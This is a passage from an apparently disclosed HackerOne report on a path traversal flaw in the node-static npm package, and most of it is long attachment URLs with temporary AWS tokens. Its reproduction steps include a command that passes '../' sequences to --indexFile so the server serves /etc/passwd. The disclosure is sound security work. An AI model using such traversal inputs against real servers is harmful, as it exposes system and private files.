data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hRWdGmKxjNHzMUVR1RnZZKkB?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=b7e9b3c78e14ca2158be2e8f46d365779f7cc59d2899cc92bea80c579c81673a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hRWdGmKxjNHzMUVR1RnZZKkB?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=b7e9b3c78e14ca2158be2e8f46d365779f7cc59d2899cc92bea80c579c81673a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe content of the downloaded file:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4zqGHfea8bHigiC84YQS9aRW?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=c65f52e0d6bbea651f922bb3e31a908304cd6bb7fe3570c3a007da38770c5a15\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4zqGHfea8bHigiC84YQS9aRW?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=c65f52e0d6bbea651f922bb3e31a908304cd6bb7fe3570c3a007da38770c5a15\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can get the same result when \u003ccode\u003enode-static\u003c/code\u003e server is run from CLI:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Yy2jUGZVTdCeFmhYTmwkzvsW?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=0080c6737d64c592c66d0ce031b34c0a1d039f439565ad96c548d8129ab02414\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Yy2jUGZVTdCeFmhYTmwkzvsW?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063711Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=0080c6737d64c592c66d0ce031b34c0a1d039f439565ad96c548d8129ab02414\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis time, server was created with following command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003einstall \u003ccode\u003enode-static\u003c/code\u003e with \u003ccode\u003enpm i node-static\u003c/code\u003e command\u003c/li\u003e\n\u003cli\u003ein the folder with \u003ccode\u003e./node_modules\u003c/code\u003e, run following command (on Linux or macOS):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eensure you put enough \u003ccode\u003e../\u003c/code\u003e sequences to reach root folder (\u003ccode\u003e/\u003c/code\u003e) on your machine, depending on how deep your \u003ccode\u003enode_modules\u003c/code\u003e folder is located\u003c/li\u003e\n\u003cli\u003ewith browser of your choice, navigate to \u003ccode\u003ehttp://127.0.0.1:8080\u003c/code\u003e. Browser should start downloading \u003ccode\u003e/etc/passwd\u003c/code\u003e file.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability was found and verified with following configuration:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003emacOS 10.14.6\u003c/li\u003e\n\u003cli\u003eNode 10.16.0\u003c/li\u003e\n\u003cli\u003enpm 6.9.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eStay Safe,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eArbitrary File Read\u003c/p\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":560591,"file_name":"2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hRWdGmKxjNHzMUVR1RnZZKkB?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063711Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=b7e9b3c78e14ca2158be2e8f46d365779f7cc59d2899cc92bea80c579c81673a","file_size":1128246,"type":"image/png"},{"id":560592,"file_name":"3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4zqGHfea8bHigiC84YQS9aRW?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063711Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=c65f52e0d6bbea651f922bb3e31a908304cd6bb7fe3570c3a007da38770c5a15","file_size":578032,"type":"image/png"},{"id":560593,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Yy2jUGZVTdCeFmhYTmwkzvsW?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063711Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=0080c6737d64c592c66d0ce031b34c0a1d039f439565ad96c548d8129ab02414","file_size":4042301,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["eveeez","0x08","yoflow"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":41077,"asset_type":"SOURCE_CODE","asset_identifier":"node-static","max_severity":"critical"},"abilities":{"assignable